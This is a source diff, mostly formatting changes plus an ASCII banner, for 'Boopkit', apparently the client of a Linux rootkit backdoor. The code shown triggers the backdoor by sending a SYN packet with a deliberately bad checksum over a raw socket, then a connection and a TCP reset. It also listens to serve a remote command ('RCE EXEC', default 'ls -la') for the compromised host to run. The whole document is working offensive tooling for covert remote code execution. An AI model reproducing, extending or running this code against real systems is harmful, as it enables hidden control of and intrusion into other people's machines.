@@ -20,22 +20,31 @@
 // ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
 //
 #include <arpa/inet.h>
+#include <linux/types.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <time.h>
 #include <unistd.h>
-#include <stdbool.h>
-#include <linux/types.h>
-
 
 // clang-format off
 #include "../boopkit.h"
 #include "tcp.h"
 // clang-format on
 
-
+// asciiheader is the main runtime banner.
+void asciiheader() {
+  printf("\n\n");
+  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
+  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
+  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
+  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
+  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
+  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
+  printf("\n\n");
+}
 
 void usage() {
   printf("Boopkit version: %s\n", VERSION);
@@ -49,13 +58,13 @@ void usage() {
   printf("-lport             Local  (src) port:    3535\n");
   printf("-rhost             Remote (dst) address: 127.0.0.1.\n");
   printf("-rport             Remote (dst) port:    22\n");
-  printf("-x, execute        Command to execute on the boopscript server: ls -la\n");
+  printf(
+      "-x, execute        Command to execute on the boopscript server: ls "
+      "-la\n");
   printf("-h, help           Display help and usage for boopkit.\n");
   printf("\n");
   exit(0);
 }
-
-
 
 // config is the configuration options for the program
 struct config {
@@ -76,26 +85,26 @@ void clisetup(int argc, char **argv) {
   strncpy(cfg.rport, "22", MAX_PORT_STR);
   strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
   for (int i = 0; i < argc; i++) {
-    if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1){
+    if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1) {
       strncpy(cfg.lport, argv[i + 1], MAX_PORT_STR);
     }
-    if (strncmp(argv[i], "-rport", 32) == 0 && argc >= i + 1){
+    if (strncmp(argv[i], "-rport", 32) == 0 && argc >= i + 1) {
       strncpy(cfg.rport, argv[i + 1], MAX_PORT_STR);
     }
-    if (strncmp(argv[i], "-lhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1){
+    if (strncmp(argv[i], "-lhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1) {
       strncpy(cfg.lhost, argv[i + 1], MAX_PORT_STR);
     }
-    if (strncmp(argv[i], "-rhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1){
+    if (strncmp(argv[i], "-rhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1) {
       strncpy(cfg.rhost, argv[i + 1], MAX_PORT_STR);
     }
     if (argv[i][0] == '-') {
       switch (argv[i][1]) {
-      case 'h':
-        usage();
-        break;
-      case 'x':
-        strncpy(cfg.rce, argv[i + 1], MAX_RCE_SIZE);
-        break;
+        case 'h':
+          usage();
+          break;
+        case 'x':
+          strncpy(cfg.rce, argv[i + 1], MAX_RCE_SIZE);
+          break;
       }
     }
   }
@@ -135,15 +144,16 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
     return 1;
   }
   printf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
-  //printf("Listening for Boopkit response...\n");
-  // n=1 is the number of clients to accept before we begin refusing clients!
+  // printf("Listening for Boopkit response...\n");
+  //  n=1 is the number of clients to accept before we begin refusing clients!
   if (listen(servesock, 1) < 0) {
     printf(" XX Socket listen failure: %s\n", listenstr);
     return 1;
   }
   int clientsock;
   int addrlen = sizeof laddr;
-  if ((clientsock = accept(servesock, (struct sockaddr*)&laddr, (socklen_t*)&addrlen)) < 0 ) {
+  if ((clientsock = accept(servesock, (struct sockaddr *)&laddr,
+                           (socklen_t *)&addrlen)) < 0) {
     printf(" XX Socket accept failure: %s\n", listenstr);
     return 1;
   }
@@ -173,7 +183,6 @@ int main(int argc, char **argv) {
   printf("LHOST    [%s]\n", cfg.lhost);
   printf("LPORT    [%s]\n", cfg.lport);
   printf("RCE EXEC [%s]\n", cfg.rce);
-
 
   // [Destination]
   // Configure daddr fields sin_port, sin_addr, sin_family
@@ -237,7 +246,8 @@ int main(int argc, char **argv) {
     printf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
     return 2;
   }
-  printf("SYN      [bad checksum] -> %s:%s %d bytes\n", cfg.rhost, cfg.rport, sent);
+  printf("SYN      [bad checksum] -> %s:%s %d bytes\n", cfg.rhost, cfg.rport,
+         sent);
   close(sock1);
   // ===========================================================================
 
@@ -262,7 +272,6 @@ int main(int argc, char **argv) {
   printf("CONNECT  [    okay    ] -> %s:%s\n", cfg.rhost, cfg.rport);
   close(sock2);
   // ===========================================================================
-
 
   // ===========================================================================
   // 3. TCP Reset SOCK_RAW
